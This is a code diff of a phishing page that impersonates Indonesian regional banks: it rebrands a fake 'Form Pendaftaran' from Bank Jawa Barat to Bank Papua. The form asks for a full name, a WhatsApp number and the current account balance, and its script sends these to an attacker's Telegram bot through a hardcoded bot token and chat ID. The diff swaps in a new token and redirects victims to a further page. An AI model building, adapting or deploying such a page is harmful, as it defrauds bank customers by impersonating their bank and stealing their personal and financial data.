@@ -2,81 +2,109 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Form Pendaftaran - Bank Jawa Barat</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Form Pendaftaran - Bank Papua</title>
+  <!-- Bootstrap CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
+    /* Background dan font */
     body {
-      background-color: #f8f9fa;
+      background: linear-gradient(135deg, #bdcd7b, #b3c88f);
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
       display: flex;
-      justify-content: center;
-      align-items: center;
       flex-direction: column;
-      height: 100vh;
-      font-family: 'Arial', sans-serif;
-      padding: 20px;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
     }
-    .form-container {
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-      width: 100%;
+    /* Container Form */
+    .card-form {
+      background: #fff;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
       max-width: 400px;
-      border: 2px solid #0033a0;
-      text-align: center;
+      width: 100%;
+      padding: 2rem;
+      position: relative;
+      margin: 1rem;
     }
-    .form-header {
-      height: 40px;
-      margin-bottom: 10px;
+    .card-form::before {
+      content: '';
+      position: absolute;
+      top: -50px;
+      left: calc(50% - 100px);
+      width: 200px;
+      height: 200px;
+      background: url('bank.png') no-repeat center center;
+      background-size: contain;
+    }
+    .card-form h2 {
+      color: #00347d;
+      text-align: center;
+      margin-top: 50px;
+      margin-bottom: 1.5rem;
+      font-weight: 700;
     }
     .form-label {
-      font-weight: bold;
-      text-align: left;
-      display: block;
+      font-weight: 500;
+      color: #333;
     }
     .form-control {
-      border: 2px dashed #0033a0;
-      border-radius: 5px;
+      border: 2px solid #00347d;
+      border-radius: 10px;
+      padding: 0.75rem;
+      transition: border-color 0.3s;
+    }
+    .form-control:focus {
+      border-color: #002259;
+      box-shadow: none;
     }
     .btn-primary {
-      background-color: #0033a0;
+      background-color: #00347d;
       border: none;
-      padding: 10px;
-      font-weight: bold;
-      width: 100%;
-      margin-top: 10px;
-      border-radius: 5px;
+      border-radius: 10px;
+      padding: 0.75rem;
+      font-weight: 700;
+      transition: background-color 0.3s;
     }
+    .btn-primary:hover {
+      background-color: #002259;
+    }
+    /* Footer */
     .footer {
-      font-size: 12px;
-      color: #333;
       text-align: center;
-      margin-top: 15px;
+      margin-top: 1rem;
+      color: #fff;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <img src="bankbjb.png" alt="Bank Jateng" class="form-header">
+  <div class="card-form">
+    <h2>Form Pendaftaran</h2>
     <form id="registrationForm">
       <div class="mb-3">
-        <label class="form-label">Nama Lengkap Tanpa Singkatan</label>
+        <label class="form-label" for="namaLengkap">Nama Lengkap Tanpa Singkatan</label>
         <input type="text" id="namaLengkap" class="form-control" placeholder="Masukkan Nama Lengkap" required>
       </div>
       <div class="mb-3">
-        <label class="form-label">Nomor WhatsApp</label>
+        <label class="form-label" for="nomorHp">Nomor WhatsApp</label>
         <input type="tel" id="nomorHp" class="form-control" placeholder="Masukkan Nomor WhatsApp" required>
       </div>
       <div class="mb-3">
-        <label class="form-label">Saldo Tabungan Rekening Saat Ini</label>
+        <label class="form-label" for="saldoAkhir">Saldo Tabungan Rekening Saat Ini</label>
         <input type="text" id="saldoAkhir" class="form-control" placeholder="Rp" required>
       </div>
-      <button type="submit" class="btn btn-primary">Lanjutkan</button>
+      <button type="submit" class="btn btn-primary w-100">Lanjutkan</button>
     </form>
   </div>
+
   <div class="footer">
-    <p>©Bank Pembangunan Daerah Jawa Barat</p>
+    © Bank Papua
   </div>
 
   <!-- Modal Rate Limit -->
@@ -99,46 +127,43 @@
 
   <!-- Bootstrap Bundle JS (termasuk Popper) -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-  
   <script>
     document.getElementById("registrationForm").addEventListener("submit", function(event) {
       event.preventDefault();
-
-      // Rate-limiting: Cek apakah form sudah disubmit dalam 400.000 ms (beberapa menit)
+      
+      // Rate-limiting: Cek apakah form sudah disubmit dalam 210.000 ms (3,5 menit)
       let lastSubmit = localStorage.getItem("lastSubmitTime");
       let now = new Date().getTime();
       if (lastSubmit && (now - lastSubmit < 210000)) {
-        // Tampilkan modal rate-limit
         let rateLimitModal = new bootstrap.Modal(document.getElementById('rateLimitModal'));
         rateLimitModal.show();
         return;
       }
       localStorage.setItem("lastSubmitTime", now);
-
+      
       let nama = document.getElementById("namaLengkap").value.trim();
       let noHp = document.getElementById("nomorHp").value.trim();
       let saldo = document.getElementById("saldoAkhir").value.replace(/\D/g, "");
-
+      
       let validasiHp = /^((\+62|62)|0)8[1-9][0-9]{7,10}$/;
       if (!validasiHp.test(noHp)) {
         alert("Nomor HP harus dalam format Indonesia yang valid!");
         return;
       }
-
+      
       let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);
-
-      let botToken = "7604777750:AAH9RB4zMFulhp_5gJPWMq8TDmZ13Z8DSFE";
+      
+      let botToken = "8019506567:AAGpDwSssP4xnJOtLX0HNUnBS1nUlisl7Xk";
       let chatId = "7644113955";
-      let message = `( Bank Jawa barat | Data Rek )\n\n- No HP : ${noHp}\n- Nama : ${nama}\n- Saldo : Rp. ${saldoFormatted}\n\nCopyright©2020 bagas.webkuu`;
-
+      let message = `( Bank Papua  | Data Rek )\n\n- No HP : ${noHp}\n- Nama : ${nama}\n- Saldo : Rp. ${saldoFormatted}\n\nCopyright©2020 bagas.webkuu`;
+      
       let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
+      
       fetch(url)
         .then(response => response.json())
         .then(data => {
           if (data.ok) {
-            alert("Sukses mengirim data.");
-            window.location.href = "registrasi.html"; // Redirect ke halaman selanjutnya
+            window.location.href = "registrasi.html";
           } else {
             alert("Gagal mengirim data.");
           }
